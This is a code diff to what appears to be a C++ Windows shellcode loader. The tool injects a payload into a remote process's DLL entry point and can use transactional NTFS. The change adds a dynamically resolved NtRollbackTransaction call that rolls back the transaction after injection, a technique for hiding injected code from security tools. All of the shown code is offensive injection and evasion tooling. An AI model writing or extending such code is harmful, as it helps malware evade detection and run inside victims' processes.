@@ -625,6 +625,8 @@ typedef LONG(__stdcall* NtCreateSection_t)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBU
 typedef LONG(__stdcall* NtMapViewOfSection_t)(HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, DWORD, ULONG, ULONG);
 
 typedef NTSTATUS(__stdcall* NtCreateTransaction_t)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, LPGUID, HANDLE, ULONG, ULONG, ULONG, PLARGE_INTEGER, PUNICODE_STRING);
+// define NtRollbackTransaction:
+typedef NTSTATUS(__stdcall* NtRollbackTransaction_t)(HANDLE TransactionHandle, BOOLEAN Wait);
 
 typedef NTSTATUS (__stdcall* NtProtectVirtualMemory_t)(
     HANDLE ProcessHandle,
@@ -655,6 +657,7 @@ LdrLoadDll_t LdrLoadDll;
 NtCreateSection_t NtCreateSection;
 NtMapViewOfSection_t NtMapViewOfSection;
 NtCreateTransaction_t NtCreateTransaction;
+NtRollbackTransaction_t NtRollbackTransaction;
 NtProtectVirtualMemory_t NtProtectVirtualMemory;
 NtWaitForSingleObject_t MyNtWaitForSingleObject;
 NtQueryInformationProcess_t MyNtQueryInformationProcess;
@@ -1625,9 +1628,9 @@ int main(int argc, char *argv[])
 
     /// deal with TxF argument
     HANDLE fileHandle;
+    HANDLE hTransaction;
     if (bTxF) {
         OBJECT_ATTRIBUTES ObjAttr = { sizeof(OBJECT_ATTRIBUTES) };
-        HANDLE hTransaction;
         NTSTATUS NtStatus = NtCreateTransaction(&hTransaction, TRANSACTION_ALL_ACCESS, &ObjAttr, nullptr, nullptr, 0, 0, 0, nullptr, nullptr);
         if (!NT_SUCCESS(NtStatus)) {
             printf("[-] Failed to create transaction (error 0x%x)\n", NtStatus);
@@ -1808,6 +1811,17 @@ int main(int argc, char *argv[])
         result = WriteProcessMemoryAPC(hProcess, (BYTE*)dllEntryPoint, (BYTE*)magiccode, magiccodeSize, bUseRtlCreateUserThread, bUseCreateThreadpoolWait); 
     }
 
+    // call RollbackTransaction:
+
+    if (bTxF) {
+        NtRollbackTransaction_t NtRollbackTransaction = (NtRollbackTransaction_t)dynamic::NotGetProcAddress(GetModuleHandleA("ntdll"), "NtRollbackTransaction");
+        NTSTATUS value1 = NtRollbackTransaction(hTransaction, TRUE);
+        if(value1 != STATUS_SUCCESS) {
+            printf("[-] NtRollbackTransaction failed. Status: %x\n", value1);
+        } else {
+            printf("[+] NtRollbackTransaction succeeded\n");
+        }
+    }
     // if (!VirtualProtectEx(hProcess, dllEntryPoint, magiccodeSize, oldProtect, &oldProtect)) {
     //     printf("[-] VirtualProtectEx failed to restore original memory protection. Error: %lu\n", GetLastError());
     // }
